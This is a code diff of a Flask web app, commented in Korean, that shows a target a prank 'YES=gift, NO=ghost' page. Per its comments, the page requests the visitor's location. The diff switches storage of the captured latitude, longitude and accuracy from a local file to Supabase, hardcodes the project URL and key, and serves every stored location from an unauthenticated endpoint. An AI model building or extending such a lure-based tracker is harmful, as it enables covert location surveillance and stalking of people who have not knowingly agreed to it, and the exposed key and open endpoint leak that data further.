@@ -1,14 +1,18 @@
 from flask import Flask, request, render_template_string, jsonify
+from supabase import create_client, Client
 import json
-import os
 from datetime import datetime
+import os
 
 app = Flask(__name__)
 
-DATA_FILE = 'locations.json'
+# ===== Supabase 설정 (네 키로 완전히 교체됨) =====
+SUPABASE_URL = "https://lcxjsexvecrrjxkwdumkm.supabase.co"
+SUPABASE_KEY = "sb_publishable_Ie3ORI9_y5VVpLfqwXVh_g_Ud6uFVU6"
+supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
 
 # ============================================================
-# HTML: YES=선물, NO=귀신 (위치 요청 포함)
+# HTML: 상대방이 보는 페이지 (YES=선물, NO=귀신)
 # ============================================================
 TRACK_PAGE = '''
 <!DOCTYPE html>
@@ -164,7 +168,7 @@ MAP_PAGE = '''
 '''
 
 # ============================================================
-# Flask Routes (모든 변수명 영어!)
+# Flask Routes (Supabase 저장)
 # ============================================================
 @app.route('/')
 def track():
@@ -181,27 +185,23 @@ def receive_location():
         return jsonify({'error': 'No data'}), 400
 
     try:
-        with open(DATA_FILE, 'r') as f:
-            locations = json.load(f)
-    except:
-        locations = []
-
-    data['received_at'] = datetime.now().isoformat()
-    locations.append(data)
-
-    with open(DATA_FILE, 'w') as f:
-        json.dump(locations, f, indent=2)
-
-    return jsonify({'status': 'ok', 'count': len(locations)})
+        result = supabase.table('locations').insert({
+            'lat': data['lat'],
+            'lon': data['lon'],
+            'acc': data.get('acc'),
+            'time': data.get('time')
+        }).execute()
+        return jsonify({'status': 'ok', 'id': result.data[0]['id']})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
 
 @app.route('/api/locations', methods=['GET'])
 def get_locations():
     try:
-        with open(DATA_FILE, 'r') as f:
-            locations = json.load(f)
-    except:
-        locations = []
-    return jsonify(locations)
+        result = supabase.table('locations').select('*').execute()
+        return jsonify(result.data)
+    except Exception as e:
+        return jsonify([])
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=3000)
